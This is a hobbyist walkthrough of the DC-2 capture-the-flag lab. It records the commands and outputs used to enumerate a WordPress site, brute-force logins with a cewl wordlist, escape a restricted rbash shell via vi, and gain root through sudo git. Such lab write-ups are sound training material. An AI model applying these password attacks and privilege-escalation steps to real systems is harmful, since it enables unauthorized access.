Did the nmap scan 
`nmap -p- -sC -sV -T5 192.168.56.103 --open`

found that port 80 http is open and hostping a apache server which runs debian
Also port 7744 is open and running ssh and OpenSSH 6.7

so lets now try to go to the website and see. eventhough we didnt put dc2, it redirects to dc2 and 
It says this site cant be reached, so lets do a quick wget and see.
`wget 192.168.56.103`
We see, the website has been moved permanently. Also failed resolving the ip address to dc-2. So lets add the ip manually.
we can use command `nano /etc/hosts` and add the line
{192.168.56.103 dc-2}. Now if we do another wget, we get a 200 OK. so lets try visiting the site.

We found flag 1
**Flag 1:**
Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl.

More passwords is always better, but sometimes you just can’t win them all.

Log in as one to see the next flag.

If you can’t find it, log in as another.

So since this is a wordpress site. We can use the tool wpscan for this. 
`wpscan --url http://dc-2 -e vt,vp,u`

--url = URL
-e = enumerate
vt = Vulnerable themes
vp =Vulnerable plugins
u = users

We found 3 user names. tom, jerry and admin
So the flag 1 gave us the hint about wordlists and a tool called cewl. So cewl is a tool which spiders websites and generate specific wordlists that suits the site. So lets use it.
`cewl http://dc-2 > /usr/share/wordlists/cewlpasswords.txt`
This will cewl the website and generate the password list and output it to the file we stated in the wordlists directory. so we can now do the password attack. we can use the tool wpscan for this too
`wpscan --url http://dc-2 --passwords /usr/share/wordlists/cewlpasswords.txt --usernames tom,jerry,admin`

we found two passwords
| Username: jerry, Password: adipiscing  
| Username: tom, Password: parturient

Lets now login to the site and see. So the default login page for wordpress exists in
/wp-login.php. so lets to to login. Nothing found in tom, but we found flag 2 
**Flag 2:**

If you can't exploit WordPress and take a shortcut, there is another way.

Hope you found another entry point.

So as we seen earlier, there is OpenSSH and we have some credentials. So lets try if we can get into a shell using these creds. ==We have to specify the port because this doesnt use the default port.==

`ssh -p 7744 tom@192.168.56.103`
Ok, we managed to get inside a shell using the toms credentials. If we just `ls` we can see the flag3.
we cant just cat the flag because tom is in a restricted rbash shell. so lets see what we can use.
we can only use {less  ls  scp  vi}.

We can use the command vi to view the flag3.

Flag3 : Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.

So this hints us to switch user to jerry.
==So first we have to get out of this restricted shell first.  So we can use vi for this. We can use the : to enter bash commands==

`vi`
`set shell=/bin/bash`
`shell`

so now we are out of the shell inside a bash shell. not r bash. 
**Save and exit:** `Esc` → `:wq` → `Enter`

qq

So to get out an restricted shell we can use this command. 

`export PATH=$PATH:/bin:/usr/bin`

Ok now we are out of this restricted environment and we can use commands like cat

if we try to get su privileges, we cant because tom doesnt run sudo. So if we look at the hint we got. It says we need to switch as jerry and then try su.

So we can see who else is there by going to home. So we can see Jerry is there in this. so if we go there we can see the flag4.

`cat /home/jerry/flag4.txt`
Good to see that you've made it this far - but you're not home yet.  
  
You still need to get the final flag (the only flag that really counts!!!).  
  
No hints here - you're on your own now.  :-)  
  
Go on - git outta here!!!!  
  
tom@DC-2:~$

So this gave a hint on 'git'.  

So we still didnt switch to jerry, so lets switch to jerry because we cant get to the root here, 

we can use 
`su jerry` and jerries password. it worked and we now logged as jerry. so we again try `sudo -l` and we got this.
jerry@DC-2:/home/tom$ sudo -l  
Matching Defaults entries for jerry on DC-2:  
   env_reset, mail_badpass,  
   secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin  
  
User jerry may run the following commands on DC-2:  
   (root) NOPASSWD: /usr/bin/git  

So as this says, we dont need any password for root and all we have to do is exploit git. so let go to GTFObins and see.

we found this
`git branch --help config` = we enter this and then paste `!/bin/sh` and we are root.
Ok, we found the final flag in the root directory.

```
# cat /root/final-flag.txt  
__    __     _ _       _                    _  
/ / /\ \ \___| | |   __| | ___  _ __   ___  / \  
\ \/  \/ / _ \ | |  / _` |/ _ \| '_ \ / _ \/  /  
\  /\  /  __/ | | | (_| | (_) | | | |  __/\_/  
 \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___\/  
  
  
Congratulatons!!!  
  
A special thanks to all those who sent me tweets  
and provided me with feedback - it's all greatly  
appreciated.  
  
If you enjoyed this CTF, send me a tweet via @DCAU7.  
  
```